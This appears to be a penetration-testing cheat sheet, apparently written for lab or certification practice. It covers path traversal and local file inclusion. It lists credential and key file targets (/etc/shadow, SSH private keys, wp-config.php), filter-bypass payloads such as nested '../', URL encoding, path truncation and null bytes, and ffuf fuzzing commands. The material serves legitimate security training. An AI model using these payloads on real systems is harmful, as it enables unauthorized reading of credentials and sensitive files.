## Path Traversal
General format to look out for in URLs
```
view?file=../../../../../../../../
index.php?view=../../../../../../../../
```

Common Web Roots and config files
```bash
# IIS
C:\inetpub\wwwroot
	\application\web.config
	\web.config

# XAMPP
C:\xampp\htdocs
	\conf\extra\httpd-xampp.conf
	\conf\httpd.conf
\xampp\php\php.ini # php conf file
\xampp\mysql\bin\my.ini # mysql conf file

# Linux 
/var/www/html
/var/www/<site>
/var/www/<site>/index.php   # have nginx or apache configs? site is there
/var/www/html/wordpress     # wordpress common place

# nginx
/etc/nginx/sites-enabled/default

# Apache
/etc/apache2/sites-enabled

# Some interesting files for wordpress
/var/www/html/wordpress/index.php
/var/www/html/wordpress/wp-config.php  # use PHP filter to read?
```

Research program versions and credential locations for those programs if you find an LFI present.

Also check BURP Responses for all requests, you may get more information than the page displays
#### Low Hanging Fruit
Linux:
`/etc/passwd
`/etc/shadow`
config files (research default locations)

Windows:
`/WINDOWS/system32/drivers/etc/hosts`

SSH Keys
```bash
# Linux
/home/<user>/.ssh/<keys>
/home/<user>/<keys>

# Windows
/Users/<user>/.ssh/<keys>
/Users/<user>/<keys>

# Keys -- RSA/DSA/EC/OPENSSH 32/64 for reference
id_rsa
id_dsa
id_ecdsa
id_eddsa
id_ecdsa_sk 
id_ed25519 
id_ed25519_sk
```
Conceptually, windows and linux storage of ssh keys are very similar

Also consider checking out [this](https://s4thv1k.com/posts/oscp-cheatsheet/#important-locations)

If low hanging fruit fails us, we can fuzz for stuff like config files, log files, etc...

## Basic Bypasses
Sometimes we have to get creative with LFI to bypass filters

Filename Prefix
```php
# Example of prefix
include("lang_" . $_GET['language']);
```
```bash
# How to bypass?
/../../../etc/passwd  # / in front
```

Non-Recursive Path Traversal Filters
```php
# Example of filter that deletes ../ characters
$language = str_replace('../', '', $_GET['language']);
```
```bash
# How to bypass?
....//....//....//....//etc/passwd
..././
....\/
```

Encoding
```bash
# Web filters might prevent LFI-related characters

# How to bypass? -- URL Encoder
%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 # ../../../etc/passwd
```

Approved Paths
```php
# Web apps may use regex to force use of specific path
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}
```
```bash
# How to bypass? -- examine requests to determine expected path
./language/../../../../etc/passwd   # here, language is the expected path
```

#### Appended Extension Bypass
Some webapps append extensions to input strings (ie: .php). 
	../../etc/passwd --> ../../etc/passwd.php (This won't work!)

With modern versions of PHP, we may not be able to bypass this. These methods only work with PHP versions before 5.3/5.4

Path Truncation
```bash
# Any characters after maximum length of 4096 characters are ignored (ie .php)
# Create payload that exceeds 4096 charaters AND start path with non-existent dir
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././

# Example URL
index.php?view=non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

Null Bytes -- works on PHP versions pre 5.5
```bash
# adding null byte (%00) terminates string (ie: .php)

# How to use?
../../../../etc/passwd%00
```



## LFI Fuzzing
We can use burp intruder to fuzz the path but it sucks without burp pro

LFI wordlists:
	LFI-LFISuite-pathtotest-huge.txt `START HERE`
	LFI-etc-files-of-all-linux-packages.txthome
	burp-parameter-names.txt
	LFI-Jhaddix.txt   

Webroot path lists
	[Linux web root wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
	[Windows web root wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
	/usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt

Other Tools
	[LFISuite](https://github.com/D35m0nd142/LFISuite)
	[LFiFreak](https://github.com/OsandaMalith/LFiFreak)
	[liffy](https://github.com/mzfr/liffy)

Fuzzing Demonstration
```bash
# General scan
ffuf -w /path/to/<wordlist>:FUZZ -u http://$IP/<paramater>?<file>=FUZZ -ac
	-mc all   # all all codes
	-ac       # fsmart decide what to filter
	-fs <num> # filter out defaults
	
	# Example
	ffuf -w /opt/lists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://www.snoopy.htb/download?file=FUZZ' -mc all -ac


# Fuzzing Server Web Root
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -ac
	-fs <num> # filter out defaults

# Scan again but specify web root (if you know it...)
ffuf -w /usr/share/seclists/Fuzzing/LFI/<wordlist>:FUZZ -u http://$IP/<view>?<file>=/../../../../../../../<web>/<root>/FUZZ -ac
	-fs <num> # filter out defaults

# If something has to come AFTER the specified file, include it in the ffuf command

# Fuzzing Server Logs/Configs (for Log poisoning)
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -ac
```

